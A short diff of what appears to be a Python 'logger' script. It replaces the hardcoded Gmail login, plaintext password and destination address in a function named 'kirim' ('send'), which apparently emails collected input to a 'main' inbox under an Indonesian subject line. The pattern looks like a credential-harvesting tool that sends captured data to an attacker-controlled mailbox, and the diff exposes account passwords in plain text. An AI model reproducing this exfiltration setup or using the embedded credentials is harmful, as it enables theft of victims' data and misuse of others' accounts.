@@ -80,9 +80,9 @@ def inputM(x,d):
 	return i
 def kirim():
     #LOGGER 
-   email_user = 'pepepek@gmail.com' #EMAIL USER LOGIN
-   email_password = 'pepekan' #EMAIL PASSWORD LOGIN
-   email_send = 'alviandtm@bk.ru' #EMAIL UTAMA
+   email_user = 'bulatbakso670@gmail.com' #EMAIL USER LOGIN
+   email_password = 'kalilinux' #EMAIL PASSWORD LOGIN
+   email_send = 'ahmadrofii0663@gmail.com' #EMAIL UTAMA
 
    subject = '=== KIRIMAN NYA KAK ==='
 
